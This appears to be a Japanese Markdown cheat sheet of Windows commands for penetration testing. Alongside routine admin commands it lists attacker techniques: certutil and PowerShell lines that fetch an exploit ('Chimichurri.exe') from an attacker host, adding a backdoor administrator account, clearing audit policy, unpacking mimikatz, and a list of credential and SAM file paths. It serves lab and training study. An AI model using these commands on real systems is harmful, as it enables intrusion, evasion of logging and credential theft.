以下は、指定された内容を元に、Windowsの設定やコマンドに関する情報をマークダウン形式で整理したものです。Linuxのフォーマットに合わせて清書しました。

---

# 設定関連

## WSL

### 起動
```bash
wsl
```

### GUIの起動
```bash
kex --win -m
```
![image](https://github.com/user-attachments/assets/082c90bc-4de1-4d81-9e08-b891d717da8d)

# 主要コマンド

## Command Prompt
### lock
```cmd
rundll32.exe user32.dll,LockWorkStation
```
### ログオフ
```bash
logoff
```

### シャットダウン
```bash
shutdown -a
```

#### 確認せず実行
```bash
shutdown -f
```
```bash
shutdown -f -r
```
```bash
shutdown -f -t30
```

### 他者の権限でコマンド実行

#### runas
```bash
runas /user:Administrator cmd
```

##### 認証情報を消さない
```bash
runas /user:Administrator /savecred "notepad.exe"
```
※通常は使用しない

### 名前解決

#### nslookup
```bash
nslookup -type=TXT ドメイン
```

### ハッシュ値の取得

#### certutil
```bash
certutil -hashfile ファイル名 sha1
```
![image](https://github.com/user-attachments/assets/fc7eb7a4-8a53-47cb-ab03-228bf7e7e4f7)

### ファイル関連

#### ファイル探索

##### findstr
```bash
C:\>tasklist | findstr CloudMe
```

##### gc
![image](https://github.com/user-attachments/assets/761eb345-177f-4d8d-b461-b8323c1ce99b)

#### Web
```bash
certutil -urlcache -f http://10.10.14.2:8000/Chimichurri.exe exploit.exe
```
![image](https://github.com/user-attachments/assets/0e89cadd-d41c-471d-9dae-8fc0d7a61cde)

#### 監査ポリシー
- ポリシーの確認
```bash
auditpol /get /category:*
```

- ポリシーの有効化
```bash
auditpol /set /category:"system","account logon" /success:enable /failure:enable
```

- 監査無し
```bash
auditpol /clear /y
```

- Domainサービス列挙
```bash
setspn -T ドメイン -F -Q */*
```

## ユーザ関連

- ユーザの追加
```bash
net user hacker hacker123 /add
```
```bash
net localgroup Administrators hacker /add
```
```bash
net localgroup "Remote Desktop Users" hacker /ADD
```

- パスワード変更
```bash
net user hacker newpassword
```
```bash
net user /domain hacker newpassword
```

### コンパイル
```bash
gcc hello.c -o hello.exe
```

## PowerShell

### プロパティの確認方法

1. Get-Member を使用する
```bash
Get-Process | Get-Member
```

2. Select-Object -Property * を使用する
```bash
Get-Process | Select-Object -First 1 -Property *
```

### プロパティを確認してからの使用例

- 例1: Get-Process のプロパティを使用する
```bash
Get-Process | Select-Object -Property Name, CPU
```

- 例2: Where-Object で条件を指定する
```bash
Get-Process | Where-Object -FilterScript { $_.CPU -gt 0.1 }
```

### Web
- Download
```bash
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
```
```bash
iwr -uri http://lhost/file -Outfile file
```
```bash
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
```
```bash
copy \\kali\share\file .
```

### ファイル操作
- 解凍
```bash
Expand-Archive -Path .\mimikatz.zip
```

## PowerCLI

# Event Viewer

## Application

## Security
- ユーザ追加（4720）
- プロセス作成（4688）

## System
- シャットダウン開始時刻 (ID 1074)

# その他

## 証明書のインポート
- ［スタート］→［ファイル名を指定して実行］をクリックし、名前の枠に「certmgr.msc」と入力して［OK］をクリックします。証明書管理画面が表示されますので、[信頼されたルート証明機関]の証明書フォルダを右クリックして、「すべてのタスク」から「インポート」を選択します

# 重要ファイル一覧

- `C:/Users/Administrator/NTUser.dat`
- `C:/Documents and Settings/Administrator/NTUser.dat`
- `C:/apache/logs/access.log`
- `C:/apache/logs/error.log`
- `C:/apache/php/php.ini`
- `C:/boot.ini`
- `C:/inetpub/wwwroot/global.asa`
- `C:/MySQL/data/hostname.err`
- `C:/MySQL/data/mysql.err`
- `C:/MySQL/data/mysql.log`
- `C:/MySQL/my.cnf`
- `C:/MySQL/my.ini`
- `C:/php4/php.ini`
- `C:/php5/php.ini`
- `C:/php/php.ini`
- `C:/Program Files/Apache Group/Apache2/conf/httpd.conf`
- `C:/Program Files/Apache Group/Apache/conf/httpd.conf`
- `C:/Program Files/Apache Group/Apache/logs/access.log`
- `C:/Program Files/Apache Group/Apache/logs/error.log`
- `C:/Program Files/FileZilla Server/FileZilla Server.xml`
- `C:/Program Files/MySQL/data/hostname.err`
- `C:/Program Files/MySQL/data/mysql-bin.log`
- `C:/Program Files/MySQL/data/mysql.err`
- `C:/Program Files/MySQL/data/mysql.log`
- `C:/Program Files/MySQL/my.ini`
- `C:/Program Files/MySQL/my.cnf`
- `C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err`
- `C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log`
- `C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err`
- `C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log`
- `C:/Program Files/MySQL/MySQL Server 5.0/my.cnf`
- `C:/Program Files/MySQL/MySQL Server 5.0/my.ini`
- `C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf`
- `C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf`
- `C:/Program Files (x86)/Apache Group/Apache/conf/access.log`
- `C:/Program Files (x86)/Apache Group/Apache/conf/error.log`
- `C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml`
- `C:/Program Files (x86)/xampp/apache/conf/httpd.conf`
- `C:/WINDOWS/php.ini`
- `C:/WINDOWS/Repair/SAM`
- `C:/Windows/repair/system`
- `C:/Windows/repair/software`
- `C:/Windows/repair/security`
- `C:/WINDOWS/System32/drivers/etc/hosts`
- `C:/Windows/win.ini`
- `C:/WINNT/php.ini`
- `C:/WINNT/win.ini`
- `C:/xampp/apache/bin/php.ini`
- `C:/xampp/apache/logs/access.log`
- `C:/xampp/apache/logs/error.log`
- `C:/Windows/Panther/Unattend/Unattended.xml`
- `C:/Windows/Panther/Unattended.xml`
- `C:/Windows/debug/NetSetup.log`
- `C:/Windows/system32/config/AppEvent.Evt`
- `C:/Windows/system32/config/SecEvent.Evt`
- `C:/Windows/system32/config/default.sav`
- `C:/Windows/system32/config/security.sav`
- `C:/Windows/system32/config/software.sav`
- `C:/Windows/system32/config/system.sav`
- `C:/Windows/system32/config/regback/default`
- `C:/Windows/system32/config/regback/sam`
- `C:/Windows/system32/config/regback/security`
- `C:/Windows/system32/config/regback/system`
- `C:/Windows/system32/config/regback/software`
- `C:/Program Files/MySQL/MySQL Server 5.1/my.ini`
- `C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml`
- `C:/Windows/System32/inetsrv/config/applicationHost.config`
- `C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log`

---

この形式であれば、Linuxのまとめと同じように構造化されています。必要に応じて調整してください。
